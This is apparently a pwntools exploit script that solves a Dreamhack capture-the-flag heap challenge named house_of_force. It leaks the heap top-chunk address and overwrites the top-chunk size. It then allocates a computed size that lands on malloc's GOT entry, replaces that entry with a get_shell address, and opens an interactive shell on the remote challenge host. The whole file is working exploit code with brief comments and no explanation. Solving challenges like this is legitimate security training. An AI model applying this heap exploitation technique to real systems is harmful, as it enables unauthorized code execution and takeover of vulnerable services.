from pwn import *
import warnings

warnings.filterwarnings('ignore')

p = remote('host8.dreamhack.games', 19212)
#p = process('./house_of_force')
e = ELF('./house_of_force')

get_shell = 0x804887e
malloc_got = e.got['malloc']

# Leak topchunck_addr
p.sendlineafter("> ", "1")
p.sendlineafter(": ", "8")
p.sendlineafter(": ", "a"*8)

heap_addr = p.recvuntil(b":").replace(b":",b"").decode()
topchunk_addr = int(heap_addr, 16) + 4*3

print(hex(topchunk_addr))

# overwrite touchunck size
p.sendlineafter("> ", "2")
p.sendlineafter(": ", "0")
p.sendlineafter(": ", "3")
p.sendlineafter(": ", str(0xffffffff))

# 32bit -> -0x8
# 64bit -> -0x10 and Calc (2^64-1) &
# This case target is malloc
target_size = malloc_got - topchunk_addr - 0x8
print(hex(target_size))

# alloc target addr size
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(target_size))
p.sendlineafter(": ", "a" * target_size)

# overwrite target -> get_shell
p.sendlineafter("> ", "1")
p.sendlineafter(": ", str(4))
p.sendlineafter(": ", p32(get_shell))

# call malloc
p.sendlineafter("> ", '1')
p.sendlineafter("Size: ", str(0x10))

p.interactive()